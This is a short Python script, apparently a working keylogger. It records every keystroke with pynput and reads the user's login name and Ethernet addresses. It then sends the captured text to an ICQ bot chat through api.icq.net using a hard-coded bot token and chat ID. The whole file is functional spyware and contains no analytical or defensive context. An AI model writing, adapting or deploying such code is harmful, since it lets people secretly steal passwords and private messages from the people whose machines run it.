import requests
import psutil
from pynput import keyboard
import os

token = '001.3832146469.2688771542:1009499487'
chatId = '1005452228'
username = os.getlogin()
ether_info = ''
max_inputscount = 5
event_response = None

#################################
# # Need to get events info before
# https://api.icq.net/bot/v1/events/get?token=001.3832146469.2688771542:1009499487&lastEventId=0&pollTime=0

r = requests.get(f"https://api.icq.net/bot/v1/events/get?token={token}&lastEventId=0&pollTime=0")
event_response = r.json()
# # # Example response
# event_response = {
#     "events":[
#         {
#             "eventId":1,
#             "payload": {
#                 "chat": {
#                     "chatId": "1005452228", 
#                     "type": "private"
#                 },
#                 "from": {
#                         "firstName": "mecreate",
#                         "nick": "mecreate",
#                         "userId": "1005452228"
#                     },
#                 "msgId": "7205447602052005948",
#                 "text": "/start",
#                 "timestamp": 1677649003
#             },
#             "type": "newMessage"
#         }
#     ],
#     "ok":True
# }

chat_ids = []
if event_response:
    if event_response["ok"]:
        for response in event_response["events"]:
            new_id = response["payload"]["chat"]["chatId"]
            if not chat_ids:
                chat_ids.append(new_id)
            for cid in chat_ids:
                if cid == new_id:
                    pass                    
                else:
                    chat_ids.append(new_id)
print(chat_ids)

# # Example sending message
# https://api.icq.net/bot/v1/messages/sendText?token=001.3832146469.2688771542:1009499487&chatId=1005452228&text=hello

############################

# def update_eter_info():
if "Ethernet" in psutil.net_if_addrs():
    try:
        ether_info = f'{psutil.net_if_addrs()["Ethernet"][0][1]}\n{psutil.net_if_addrs()["Ethernet"][1][1]}\n'
        # for addr in psutil.net_if_addrs()["Ethernet"]:
        #     print(addr[1])
    except Exception as e:
        print(e)
print(ether_info)

def send_message(msg):
    for chat_id in chat_ids:
        url = f'https://api.icq.net/bot/v1/messages/sendText?token={token}&chatId={chat_id}'
        http_requests = requests.get(f"{url}&text={msg}")

def listener():
    with keyboard.Listener(on_press= keyboard_log) as lstn:
        lstn.join()

list_of_words = []
def keyboard_log(key):
    final_string = ''
    try:
        key = key.char
        list_of_words.append(key)
    except:
        for i in list_of_words:
            final_string += i

        if (len(final_string)>0):
            send_message(f"{ether_info}\n {username}: {final_string}")
            print('Sonky yazanlar:', final_string)
            list_of_words.clear()

listener()

keyboard_log(list_of_words)


